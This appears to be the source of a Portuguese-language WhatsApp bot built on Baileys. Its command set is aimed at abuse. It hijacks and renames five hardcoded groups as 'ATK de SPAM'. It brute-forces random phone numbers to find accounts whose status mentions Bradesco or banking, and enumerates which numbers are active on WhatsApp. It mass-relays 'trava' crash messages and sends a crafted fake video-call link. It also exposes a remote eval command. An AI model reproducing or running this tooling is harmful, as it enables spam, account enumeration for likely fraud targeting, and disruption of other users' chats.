const {default: makeWASocket, getLastMessageInChat, makeInMemoryStore,prepareWAMessageMedia,generateWAMessageFromContent, useMultiFileAuthState, delay, downloadContentFromMessage, DisconnectReason, templateMessage, MediaType, GroupSettingChange, isBaileys, WASocket, WAProto, getStream, relayWAMessage, Miimetype, proto, mentionedJid, processTime, MessageTypeProto, BufferJSON, GroupMetadata, getContentType} = require("@adiwajshing/baileys")

const P = require("pino")
const fs = require("fs")
const util = require("util")
const clui = require("clui")
const ms = require("ms")
const yts = require("yt-search")
const speed = require("performance-now")
const fetch = require("node-fetch")
const axios = require("axios")
const webp = require("node-webpmux")
const chalk = require("chalk")
const cfonts = require("cfonts")
const moment = require("moment-timezone")
const ffmpeg = require("fluent-ffmpeg")
const { Boom } = require("@hapi/boom")
const { exec, spawn, execSync } = require("child_process")
const { getBuffer, generateMessageTag, tempRuntime, clockString, color, fetchJson, getGroupAdmins, getRandom, parseMention, getExtension, banner, uncache, nocache, isFiltered, addFilter, ia } = require('./arquivos/funções/ferramentas')
const { prefixo, nomebot, nomedono, numerodono } = require('./arquivos/funções/configuração.json')

const options = { timeZone: 'America/Sao_Paulo', hour12: false }
const data = new Date().toLocaleDateString('pt-BR', { ...options, day: '2-digit', month: '2-digit', year: '2-digit' })
const hora = new Date().toLocaleTimeString('pt-BR', options)
const horaAtual = new Date().getHours()
const varping = speed()
const ping = speed() - varping
const timestamp = speed()
const latensi = speed() - timestamp

//Conexão
const MAX_RECONNECTION_ATTEMPTS = 3
let reconnectionAttempts = 0
async function connectToWhatsApp() {
const store = makeInMemoryStore({ logger: P().child({ level: "silent", stream: "store" }) 
})
console.log(banner.string)
const { state, saveCreds } = await useMultiFileAuthState('./arquivos/qr-code')
const ban = makeWASocket({
logger: P({ level: "silent" }),
printQRInTerminal: true,
browser: ['⟠ 𝐃͢𝐑𝐀͢𝐆͢𝟎𝐍 ⿻ ͢𝐂𝐋𝐈͢𝚵𝐍͢𝐓 ⟠', 'macOS', 'desktop'],
auth: state
})
ban.ev.on("creds.update", saveCreds)
store.bind(ban.ev)
ban.ev.on("chats.set", () => {
console.log("Tem conversas", store.chats.all())
})
ban.ev.on("contacts.set", () => {
console.log("Tem contatos", Object.values(store.contacts))
})
ban.ev.on("connection.update", (update) => {
const { connection, lastDisconnect } = update
if (connection === "close") {
const shouldReconnect = lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut;
console.log("Conexão fechada erro:", lastDisconnect.error, "Tentando reconectar...", shouldReconnect)
if (shouldReconnect && reconnectionAttempts < MAX_RECONNECTION_ATTEMPTS) {
reconnectionAttempts++
setTimeout(connectToWhatsApp, 5000)
} else {
console.log("Falha na reconexão. Limite máximo de tentativas atingido.")}
} else if (connection === "open") {
console.log(color(`➱ Conectado com sucesso!\n• Status: online\n• Horário ligado: ${hora}\n• Bem-vindo ao ${nomebot}\n➱ Próximos logs...\n`, 'green'))}
})
ban.ev.on('messages.upsert', async (m) => {
//Visualização da mensagem, etc...
try {
const info = m.messages[0]
if (!info.message) return 
if (info.key && info.key.remoteJid == "status@broadcast") return
global.bloqueado
global.prefixo

const type = Object.keys(info.message)[0] == 'senderKeyDistributionMessage' ? Object.keys(info.message)[2] : (Object.keys(info.message)[0] == 'messageContextInfo') ? Object.keys(info.message)[1] : Object.keys(info.message)[0]
const content = JSON.stringify(info.message)
const from = info.key.remoteJid

var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : ''

const budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

var pes = (type === 'conversation' && info.message.conversation) ? info.message.conversation : (type == 'imageMessage') && info.message.imageMessage.caption ? info.message.imageMessage.caption : (type == 'videoMessage') && info.message.videoMessage.caption ? info.message.videoMessage.caption : (type == 'extendedTextMessage') && info.message.extendedTextMessage.text ? info.message.extendedTextMessage.text : ''

//Const isGroup, etc...
const isGroup = info.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? info.key.participant : info.key.remoteJid
const groupMetadata = isGroup ? await ban.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const nome = info.pushName ? info.pushName : ''
const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isCmd = body.startsWith(prefixo)
const comando = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null 
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? ban.sendMessage(from, {text: teks.trim(), mentions: memberr}) : ban.sendMessage(from, {text: teks.trim(), mentions: memberr})}
const quoted = info.quoted ? info.quoted : info
const mime = (quoted.info || quoted).mimetype || ""
const sleep = async (ms) => {return new Promise(resolve => setTimeout(resolve, ms))}

//Outras const...
const isBot = info.key.fromMe ? true : false
const isOwner = numerodono.includes(sender)
const BotNumber = ban.user.id.split(':')[0]+'@s.whatsapp.net'
const isGroupAdmins = groupAdmins.includes(sender) || false 
const isBotGroupAdmins = groupAdmins.includes(BotNumber) || false
const isUrl = (url) => { return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi')) }
const deviceType = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'

const enviar = (text) => {
ban.sendMessage(from, {text: text}, {quoted: info})}

//Const isQuoted.
const isImage = type == "imageMessage"
const isVideo = type == "videoMessage"
const isAudio = type == "audioMessage"
const isSticker = type == "stickerMessage"
const isContact = type == "contactMessage"
const isLocation = type == "locationMessage"
const isProduct = type == "productMessage"
const isMedia = (type === "imageMessage" || type === "videoMessage" || type === "audioMessage") 
typeMessage = body.substr(0, 50).replace(/\n/g, "")
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"
const isQuotedMsg = type === "extendedTextMessage" && content.includes("textMessage")
const isQuotedImage = type === "extendedTextMessage" && content.includes("imageMessage")
const isQuotedVideo = type === "extendedTextMessage" && content.includes("videoMessage")
const isQuotedDocument = type === "extendedTextMessage" && content.includes("documentMessage")
const isQuotedAudio = type === "extendedTextMessage" && content.includes("audioMessage")
const isQuotedSticker = type === "extendedTextMessage" && content.includes("stickerMessage")
const isQuotedContact = type === "extendedTextMessage" && content.includes("contactMessage")
const isQuotedLocation = type === "extendedTextMessage" && content.includes("locationMessage")
const isQuotedProduct = type === "extendedTextMessage" && content.includes("productMessage")

//Obtém o conteúdo de um arquivo em formato de buffer
const getFileBuffer = async (mediakey, MediaType) => {
const stream = await downloadContentFromMessage(mediakey, MediaType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
return buffer}


//Respostas de verificação
resposta = {
espere: "Por favor, aguarde um momento...",
registro: `Olá ${nome}, parece que você ainda não está registrado. Para fazer seu registro, utilize o comando ${prefixo}rg.`,
rg: "Oops! Parece que você já está registrado. Não é possível ter mais de um registro por usuário.",
premium: "Lamentamos, mas você não possui uma assinatura Premium. Este comando é exclusivo para usuários na lista Premium. Aproveite todos os benefícios de se tornar Premium!",
bot: "Este comando só pode ser executado pelo bot.",
dono: "Desculpe, mas apenas o dono do bot pode utilizar este comando.",
grupo: "Este comando só pode ser utilizado em grupos.",
privado: "Este comando só pode ser utilizado em conversas privadas.",
adm: "Apenas administradores do grupo podem utilizar este comando.",
botadm: "Este comando só pode ser utilizado quando o bot é um administrador do grupo.",
erro: "Desculpe, ocorreu um erro. Por favor, tente novamente mais tarde."}

//Verificação anti-spam
if (isCmd) {
if (isFiltered(sender)) {
return enviar('Sem flood amigo... agora espere 5 segundos.')
} else {
addFilter(sender)}}

//Mensagens do console
if (isGroup) {
if (isCmd && !isBot) {
console.log(
color(`\n ⟨ Comando em grupo ⟩`, 'yellow'),
color(`\n➱ Comando: ${comando}`, 'green'),
color(`\n➱ Número: ${sender.split("@")[0]}`, 'green'),
color(`\n➱ Grupo: ${groupName}`, 'green'),
color(`\n➱ Nome: ${nome}`, 'green'),
color(`\n➱ Hora: ${hora}\n`, 'green'))
} else if (!isBot) {
console.log(
color(`\n ⟨ Mensagem em grupo ⟩`, 'yellow'),
color(`\n➱ Comando: ${color('Não', 'red')}`, 'green'),
color(`\n➱ Número: ${sender.split("@")[0]}`, 'green'),
color(`\n➱ Grupo: ${groupName}`, 'green'),
color(`\n➱ Nome: ${nome}`, 'green'),
color(`\n➱ Hora: ${hora}\n`, 'green'))}
} else {
if (isCmd && !isBot) {
console.log(
color(`\n ⟨ Comando no privado ⟩`, 'yellow'),
color(`\n➱ Comando: ${comando}`, 'green'),
color(`\n➱ Número: ${sender.split("@")[0]}`, 'green'),
color(`\n➱ Nome: ${nome}`, 'green'),
color(`\n➱ Hora: ${hora}\n`, 'green'))
} else if (!isBot) {
console.log(
color(`\n ⟨ Mensagem no privado ⟩`, 'yellow'),
color(`\n➱ Comando: ${color('Não', 'red')}`, 'green'),
color(`\n➱ Número: ${sender.split("@")[0]}`, 'green'),
color(`\n➱ Nome: ${nome}`, 'green'),
color(`\n➱ Hora: ${hora}\n`, 'green'))}}


//Aqui começa os comandos com prefixo
switch(comando) {


case 'jid':
enviar(from)
break

case 'atkspam':
if (!info.key.fromMe) return enviar(`Apenas usuários com permissão podem usar isso.`)
const spam = `♨️⃟‼️ ATK de SPAM ‼️⃟♨️`
const gwroup1 = `120363140982741938@g.us`
const gwroup2 = `120363144226724432@g.us`
const gwroup3 = `120363162698654590@g.us`
const gwroup4 = `120363158987225846@g.us`
const gwroup5 = `120363144482390537@g.us`

const gawy2 = await ban.groupMetadata(gwroup1);
const gawyy2 = await ban.groupMetadata(gwroup2)
const gawyyy2 = await ban.groupMetadata(gwroup3)
const gawyyyy2 = await ban.groupMetadata(gwroup4)
const gawyyyyy2 = await ban.groupMetadata(gwroup5)

let data18 = fs.readFileSync('num.json'); // ler o arquivo JSON
let jsonData18 = JSON.parse(data18);
jsonData18.numero = `${gawy2.subject}`;
jsonData18.numero2 = `${gawyy2.subject}`; 
jsonData18.numero3 = `${gawyyy2.subject}`;
jsonData18.numero4 = `${gawyyyy2.subject}`;
jsonData18.numero5 = `${gawyyyyy2.subject}`; 


 // alterar a propriedade desejada
let newData18 = JSON.stringify(jsonData18); 
fs.writeFileSync('num.json', newData18); // salvar o arquivo
const num18 = JSON.parse(fs.readFileSync('./num.json'));
resul = num18["numero"]
resul2 = num18["numero2"]
resul3 = num18["numero3"]
resul4 = num18["numero4"]
resul5 = num18["numero5"]

all = `${resul} | ${resul2} | ${resul3} | ${resul4} | ${resul5}`
ban.sendMessage(sender, {text:`\n\nNome(s) antigo(s): ${all} | \n\n📍» Nome Definido: ${spam} || \n\n🦠» Para voltar o(s) nome(s) ao(s) antigo(s), envie ".voltargps", sem as aspas.\n\n`})
await ban.groupUpdateSubject(gwroup1, `${spam}`)
await ban.groupUpdateSubject(gwroup2, `${spam}`)
await ban.groupUpdateSubject(gwroup3, `${spam}`)
await ban.groupUpdateSubject(gwroup4, `${spam}`)
await ban.groupUpdateSubject(gwroup5, `${spam}`)


ban.groupSettingUpdate(gwroup1, `announcement`)
ban.groupSettingUpdate(gwroup2, `announcement`)
ban.groupSettingUpdate(gwroup3, `announcement`)
ban.groupSettingUpdate(gwroup4, `announcement`)
ban.groupSettingUpdate(gwroup5, `announcement`)

break

case 'voltargps':
if (!info.key.fromMe) return enviar(`Apenas usuários com permissão podem usar isso.`)
const gp1_ = `120363140982741938@g.us`
const gp2_ = `120363144226724432@g.us`
const gp3_ = `120363162698654590@g.us`
const gp4_ = `120363158987225846@g.us`
const gp5_ = `120363144482390537@g.us`

const num3 = JSON.parse(fs.readFileSync('./num.json'));
resul = num3["numero"]
resul2 = num3["numero2"]
resul3 = num3["numero3"]
resul4 = num3["numero4"]
resul5 = num3["numero5"]

enviar(' Sucesso! Todos os Nomes foram recolocados. ')
await ban.groupUpdateSubject(gp1_, `${resul}`)
ban.groupUpdateSubject(gp2_, `${resul2}`)
ban.groupUpdateSubject(gp3_, `${resul3}`)
ban.groupUpdateSubject(gp4_, `${resul4}`)
ban.groupUpdateSubject(gp5_, `${resul5}`)

ban.groupSettingUpdate(gp1_, `not_announcement`)
ban.groupSettingUpdate(gp2_, `not_announcement`)
ban.groupSettingUpdate(gp3_, `not_announcement`)
ban.groupSettingUpdate(gp4_, `not_announcement`)
ban.groupSettingUpdate(gp5_, `not_announcement`)
break

case 'gen':
{
enviar("Calma ai carai, to procurando numero do Bradesco aquiKKKK")
  async function Gen() {
    let ativokk = "\n Bradesco ☠️: \n";
    for (let i = 0; i < 250; i++) {
        const numero6 = Math.floor(Math.random() * 90000000) + 10000000;
        const numero5 = Math.floor(Math.random() * 9000000) + 1000000;
        const numero4 = Math.floor(Math.random() * 900000) + 100000;
        const numero3 = Math.floor(Math.random() * 90000) + 10000;
        const numero2 = Math.floor(Math.random() * 9000) + 1000;
        const numero1 = Math.floor(Math.random() * 900) + 100;

      let texto = `${q}`;
        texto = texto.replace("xxxxxx", `${numero6.toString().slice(2)}`);
        texto = texto.replace("xxxxx", `${numero5.toString().slice(2)}`);
        texto = texto.replace("xxxx", `${numero4.toString().slice(2)}`);
        texto = texto.replace("xxx", `${numero3.toString().slice(2)}`);
        texto = texto.replace("xx", `${numero2.toString().slice(2)}`);
        texto = texto.replace("x", `${numero1.toString().slice(2)}`);
try{
let result = JSON.stringify(await (ban.fetchStatus(`${texto}@s.whatsapp.net`))).toLowerCase()
if (result.indexOf('bradesco') != -1){
  ativokk += `\n${texto}\n`
}
else if (result.indexOf('financeiro') != -1){
  ativokk += `\n${texto}\n`
}
else if (result.indexOf('agência') != -1){
  ativokk += `\n${texto}\n`
}
else if (result.indexOf('atendimento') != -1){
  ativokk += `\n${texto}\n`
}
else if (result.indexOf('gerente') != -1){
  ativokk += `\n${texto}\n`
}
else if (result.indexOf('horario comercial') != -1){
  ativokk += `\n${texto}\n`
}
else if (result.indexOf('gerente') != -1){
  ativokk += `\n${texto}\n`
}
else if (result.indexOf('business') != -1){
  ativokk += `\n${texto}\n`
}
else if (result.indexOf('banco') != -1){
  ativokk += `\n${texto}\n`  
}
else if (result.indexOf('cielo') != -1){
  ativokk += `\n${texto}\n`
  
}

else {
  console.log(color(`${texto} - ${result}`, 'green'))
}
}
catch (e){
}
}
            const c = ativokk;
                enviar(`${c}`); // Enviar a mensagem com todos os números
  }

  Gen();
  
}
break

case 'onwa':
{
        let ativokk = "\n Números Ativos: \n";
        let inativokk = "\n\n Números Inativos\n\n";
        
  async function GenWa() {

    for (let i = 0; i < 30; i++) {
        const numero6 = Math.floor(Math.random() * 90000000) + 10000000;
        const numero5 = Math.floor(Math.random() * 9000000) + 1000000;
        const numero4 = Math.floor(Math.random() * 900000) + 100000;
        const numero3 = Math.floor(Math.random() * 90000) + 10000;
        const numero2 = Math.floor(Math.random() * 9000) + 1000;
        const numero1 = Math.floor(Math.random() * 900) + 100;

      let texto = `${q}`;
        texto = texto.replace("xxxxxx", `${numero6.toString().slice(2)}`);
        texto = texto.replace("xxxxx", `${numero5.toString().slice(2)}`);
        texto = texto.replace("xxxx", `${numero4.toString().slice(2)}`);
        texto = texto.replace("xxx", `${numero3.toString().slice(2)}`);
        texto = texto.replace("xx", `${numero2.toString().slice(2)}`);
        texto = texto.replace("x", `${numero1.toString().slice(2)}`);
        
      const result = await ban.onWhatsApp(texto);
      if (result && result[0] && result[0].exists) {
        ativokk += `\n ${texto} \n`;
      } else {
        inativokk += `\n${texto}\n`;
      }
    }
            const c = ativokk + inativokk;
                enviar(`${c}`); // Enviar a mensagem com todos os números
  }

  GenWa();
}
break;

case 'fns':
{
        for (let i = 0; i < args[0]; i++) {
        let jid = from
        let fullMsg = info.message[type]. contextInfo?.quotedMessage
        await ban.relayMessage(from, fullMsg, {participant: {
           jid: from}})
        console.log(`${i} Message Sending.`)
    }
enviar(`✅ Foi Encaminhado ${args[0]} Travas Contatos Para tal.`)
    }
break

case "teste": {
  const a = JSON.stringify(info.key, null, 3);
  const parsedObj = JSON.parse(a);
  const id = parsedObj.id;
  enviar(id);
}
break;

case 'ligação':
case 'ligacao':
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./travas/oi.jpeg') }, { upload: ban.waUploadToServer })
var o = generateWAMessageFromContent(from, proto.Message.fromObject({
"generateWAMessageFromContent":{
"text":"https://call.whatsapp.com/video/Og8OKsbcBUtMlunn678ezH",
"matchedText":"https://call.whatsapp.com/video/Og8OKsbcBUtMlunn678ezH",
"description":"Link de chamada do WhatsApp",
"title":"Chamada de vídeo do WhatsApp",
"previewType":"NONE",
"jpegThumbnail":"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"
}}), { userJid: ban.user.id})
ban.relayMessage(from,o.message, { messageId: o.key.id })
break

case 'delete':
const a = JSON.stringify(info.key, null, 3);
  const parsedObj = JSON.parse(a);
  const id = parsedObj.id;
ban.sendMessage(from, { delete: info.key })

await ban.chatModify(
    { clear: { messages: [{ id: id, fromMe: true, timestamp: "1654823909" }] } }, 
    from, 
    []
    )
break

case 'reiniciar':
if (!isOwner) return enviar(resposta.dono)
enviar('Reiniciando...')
await delay(2000)
process.exit()
break

case 'get': 
try {
enviar(JSON.stringify(info.messages.stanzaId, null, 3))
} catch(e) {
console.log(e)
enviar(resposta.erro)}
break

//Aqui é o fim dos comandos sem prefixo, e começo dos sem prefixo
default:

if (body.startsWith('>')){
try {
if (info.key.fromMe) return 
if (!isOwner) return 
return ban.sendMessage(from, {text: JSON.stringify(eval(body.slice(2)),null,'\t')}).catch(e => {
return enviar(String(e))})
} catch (e){
return enviar(String(e))}}
}
} catch (e) {
e = String(e)
if (e.includes('this.isZero')) {
return
}
console.error('\n %s', color(`➱ ${e}`, 'yellow'))
console.log(color('\n « ! Crashlog ! »', 'red'), (color('Erro detectado! \n', 'yellow')))
ban.sendMessage(`${numerodono}`, {text: `Ocorreu um erro: ${e}`})}
})}
connectToWhatsApp()

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`O arquivo ${__filename} foi atualizado.\n`)
process.exit()
})